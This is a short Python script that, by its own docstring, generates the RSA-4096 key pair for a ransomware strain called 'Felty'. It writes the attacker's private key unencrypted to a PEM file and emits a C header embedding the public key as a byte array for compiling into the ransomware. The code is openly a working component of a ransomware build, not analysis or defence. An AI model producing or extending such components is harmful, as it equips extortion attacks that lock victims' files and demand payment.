#!/usr/bin/env python3
"""
felty_keygen.py — Generate RSA-4096 key pair for Felty ransomware.
Outputs: attacker_private.pem, attacker_pubkey.h
"""
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend

key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=4096,
    backend=default_backend()
)

with open("attacker_private.pem", "wb") as f:
    f.write(key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption()
    ))
print("[+] Wrote: attacker_private.pem")

pub_der = key.public_key().public_bytes(
    encoding=serialization.Encoding.DER,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
)

with open("attacker_pubkey.h", "w") as f:
    f.write("#ifndef ATTACKER_PUBKEY_H\n#define ATTACKER_PUBKEY_H\n\n")
    f.write("unsigned char attacker_pubkey_der[] = {\n")
    for i, b in enumerate(pub_der):
        if i % 12 == 0:
            f.write("    ")
        f.write("0x%02x," % b)
        if (i + 1) % 12 == 0:
            f.write("\n")
    if len(pub_der) % 12 != 0:
        f.write("\n")
    f.write("};\n")
    f.write("size_t attacker_pubkey_len = %d;\n\n" % len(pub_der))
    f.write("#endif\n")
print("[+] Wrote: attacker_pubkey.h (%d bytes)" % len(pub_der))
